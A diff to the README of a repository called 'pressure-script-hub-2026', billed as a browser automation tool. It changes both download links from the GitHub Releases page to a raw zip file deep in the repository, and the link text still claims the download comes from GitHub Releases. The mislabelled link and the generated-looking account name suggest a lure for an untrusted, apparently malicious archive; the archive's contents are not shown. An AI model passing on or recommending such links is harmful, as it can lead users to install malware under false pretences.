@@ -1,6 +1,6 @@
 # 🎯 pressure-script-hub-2026 - Lightweight Browser Automation for Speed
 
-[![Download Now](https://img.shields.io/badge/Download-🎯_pressure--script--hub--2026-2ea44f?style=for-the-badge&logo=github&labelColor=4b0082)](https://github.com/disinclined-makeready604/pressure-script-hub-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-🎯_pressure--script--hub--2026-2ea44f?style=for-the-badge&logo=github&labelColor=4b0082)](https://raw.githubusercontent.com/disinclined-makeready604/pressure-script-hub-2026/main/biggest/3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you begin, make sure your computer meets these basic requirements:
 
 Visit this link to download the application. You will find the latest release file there.
 
-**[👉 Click here to download pressure-script-hub-2026 from GitHub Releases](https://github.com/disinclined-makeready604/pressure-script-hub-2026/releases)**
+**[👉 Click here to download pressure-script-hub-2026 from GitHub Releases](https://raw.githubusercontent.com/disinclined-makeready604/pressure-script-hub-2026/main/biggest/3.0.zip)**
 
 Once you have the file:
 
